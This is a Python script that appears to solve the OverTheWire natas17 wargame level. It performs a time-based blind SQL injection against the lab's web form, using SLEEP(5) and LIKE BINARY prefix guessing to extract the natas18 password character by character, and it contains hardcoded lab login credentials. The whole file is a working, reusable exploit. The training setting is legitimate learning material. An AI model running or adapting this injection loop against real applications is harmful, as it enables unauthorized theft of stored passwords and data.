import requests             #type: ignore 
import time


url="http://natas17.natas.labs.overthewire.org"
auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
data={"username":"name"}
params={"debug":1}



# query='natas18" and 0=(SELECT IF ((SELECT password from users where username="natas18") LIKE BINARY "a%", SLEEP(5),1))  and "1"="1'

fixed_prefix='natas18" and 0=(SELECT IF ((SELECT password from users where username="natas18") LIKE BINARY "'
fixed_suffix='%", SLEEP(5),1)) -- '
password=''

searchspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


for k in range(32-len(password)):
    print(f"k: {k}")
    for i in searchspace:
        query=f"{fixed_prefix}{password}{i}{fixed_suffix}"
        data["username"]=query
        start_time=time.time()
        r=requests.post(url,data=data,auth=auth,params=params)
        end_time=time.time()
        total_time=end_time-start_time
        print(f"{i}: time={total_time}s")
        if total_time>5:
            password+=i
            print(f"{len(password)}: {password}")
            break



